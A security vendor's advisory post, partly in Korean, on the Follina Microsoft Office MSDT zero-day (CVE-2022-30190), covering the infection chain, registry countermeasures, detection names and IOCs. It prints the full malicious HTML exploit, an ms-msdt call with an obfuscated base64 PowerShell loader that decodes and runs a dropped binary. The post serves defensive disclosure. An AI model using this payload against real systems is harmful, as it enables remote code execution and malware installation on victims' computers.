<div>
Posted on
<a href="https://asec-ahnlab-com.translate.goog/ko/34919/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=ru&amp;_x_tr_pto=wapp" rel="bookmark" title="7:27 PM">May 31, 2022</a>
<h1 class="title">caution! Microsoft Office Zero-Day Vulnerability Follina (CVE-2022-30190)</h1>
<p></p>
<p>A new vulnerability, CVE-2022-30190, referred to as Follina, has been disclosed. According to Microsoft, the vulnerability results in a remote code execution vulnerability when a calling application such as Word calls MSDT using the URL protocol. When this vulnerability occurs, arbitrary code can be executed with the privileges of the calling application, additional programs can be installed, and data can be checked, changed, or deleted.</p>
<p></p>
<p>1. Vulnerability Malware Example</p>
<p>In the Word document in which this vulnerability was confirmed, the HTML file that caused the vulnerability was downloaded and executed through the URL connection written in the External tag, which is a known method. (Currently, the URL is not activated, so no additional actions are performed.) As the MSDT of the downloaded HTML is called by accessing the URL at the same time as Word is executed, a vulnerability occurs and malicious code execution is possible.</p>
<figure class="aligncenter size-full">
<img alt="" class="wp-image-34922 jetpack-lazy-image jetpack-lazy-image--handled" height="250" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C%EC%A4%91.png?resize=440%2C250&amp;ssl=1" width="440"/>
<img alt="" class="wp-image-34922" height="250" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C%EC%A4%91.png?resize=440%2C250&amp;ssl=1" width="440"/>
<figcaption>
 [Figure 1] – Attempt to connect Exteranl tag URL in Word document
 </figcaption>
</figure>
<figure class="aligncenter size-large">
<img alt="" class="wp-image-34923 jetpack-lazy-image jetpack-lazy-image--handled" height="144" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9Crels.png?resize=1024%2C144&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1024"/>
<img alt="" class="wp-image-34923" height="144" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9Crels.png?resize=1024%2C144&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1024"/>
<figcaption>
 [Figure 2] – content of document.xml.rels
 </figcaption>
</figure>
<p><a href="https://translate.google.com/website?sl=auto&amp;tl=en&amp;hl=ru&amp;client=webapp&amp;u=https://www.huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug">The contents of the above RDF8421.html disclosed in the external data</a> are the same as the code below, and the code to execute ms-msdt is inserted at the bottom of the comment. In this form, the attacker's intended code execution is possible through ms-msdt, so various attacks are possible.</p>
<code class="">&lt;!doctype html&gt;
&lt;html lang="en"&gt;
&lt;body&gt;
&lt;script&gt;
//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-- 중략 --
//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHRhc2traWxsIC9mIC9pbSBtc2R0LmV4ZSI7U3RhcnQtUHJvY2VzcyAkY21kIC13aW5kb3dzdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9yIC9yICV0ZW1wJSAlaSBpbiAoMDUtMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAveSYmZmluZHN0ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLnQgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5leGUiOw=='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code>
<p></p>
<p></p>
<p></p>
<p>2. Vulnerability countermeasures</p>
<p><a href="https://translate.google.com/website?sl=auto&amp;tl=en&amp;hl=ru&amp;client=webapp&amp;u=https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/">MS에서 공개</a>한 대응 방안은 아래와 같다.</p>
<ul>
<li>MSDT URL 프로토콜을 비활성화
1. 명령 프롬프트(cmd.exe)를 관리자로 실행
2. 레지스트리 키를 백업하기위해 “reg export HKEY_CLASSES_ROOT\ms-msdt filename ” 명령 실행
3. “reg delete HKEY_CLASSES_ROOT\ms-msdt /f” 명령 실행</li>
</ul>
<p></p>
<p></p>
<p></p>
<p>3. 안랩 제품 대응현황</p>
<p>AhnLab에서는 아래 진단명으로 해당 취약점 파일 및 행위 탐지가 가능하다.</p>
<ul>
<li>(파일진단명) Exploit/HTML.CVE-2022-30190.S1841</li>
<li>(행위진단명) Behavior/MDP.Event.M4313</li>
</ul>
<p></p>
<p></p>
<p>[IOC]</p>
<p>hxxps://www.xmlformats[.]com/office/word/2022/wordprocessingDrawing/RDF842l.html
52945af1def85b171870b31fa4782e52
d1fe26b84043ac11fa5ddb90906e6d56</p>
<p>연관 IOC 및 관련 상세 분석 정보는 안랩의 차세대 위협 인텔리전스 플랫폼 ‘AhnLab TIP’ 구독 서비스를 통해 확인 가능하다.</p>
<figure class="wp-block-image alignwide">
<a href="https://translate.google.com/website?sl=auto&amp;tl=en&amp;hl=ru&amp;client=webapp&amp;u=https://atip.ahnlab.com/main"><img alt="" class="wp-image-28275 jetpack-lazy-image" height="300" src="https://i2.wp.com/asec.ahnlab.com/wp-content/uploads/2021/11/ASEC_Blog_bn_800x300.png?resize=800%2C300&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="800"/>
<img alt="" class="wp-image-28275" height="300" src="https://i2.wp.com/asec.ahnlab.com/wp-content/uploads/2021/11/ASEC_Blog_bn_800x300.png?resize=800%2C300&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="800"/>
</a>
</figure>
<p>Note 1) <a href="https://translate.google.com/website?sl=auto&amp;tl=en&amp;hl=ru&amp;client=webapp&amp;u=https://www.huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug">https://www.huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug</a>
 Note 2) <a href="https://translate.google.com/website?sl=auto&amp;tl=en&amp;hl=ru&amp;client=webapp&amp;u=https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/">https://msrc-blog.microsoft.com/2022/05/30 /guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/</a></p>
<p>Categories: <a href="https://asec-ahnlab-com.translate.goog/ko/category/malware/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=ru&amp;_x_tr_pto=wapp" rel="category tag">Malware information</a> </p>
<p>Tagged as: <a href="https://asec-ahnlab-com.translate.goog/tag/cve-2022-30190/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=ru&amp;_x_tr_pto=wapp" rel="tag">CVE-2022-30190</a> , <a href="https://asec-ahnlab-com.translate.goog/tag/follina/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=ru&amp;_x_tr_pto=wapp" rel="tag">Follina</a> , Zero- <a href="https://asec-ahnlab-com.translate.goog/ko/tag/%ec%a0%9c%eb%a1%9c%eb%8d%b0%ec%9d%b4/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=ru&amp;_x_tr_pto=wapp" rel="tag">Day</a> , <a href="https://asec-ahnlab-com.translate.goog/ko/tag/%ec%b7%a8%ec%95%bd%ec%a0%90/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=ru&amp;_x_tr_pto=wapp" rel="tag">Vulnerability</a> , <a href="https://asec-ahnlab-com.translate.goog/tag/msdt/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=ru&amp;_x_tr_pto=wapp" rel="tag">MSDT</a> , <a href="https://asec-ahnlab-com.translate.goog/ko/tag/zero-day/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=ru&amp;_x_tr_pto=wapp" rel="tag">Zero-Day</a></p>
</div>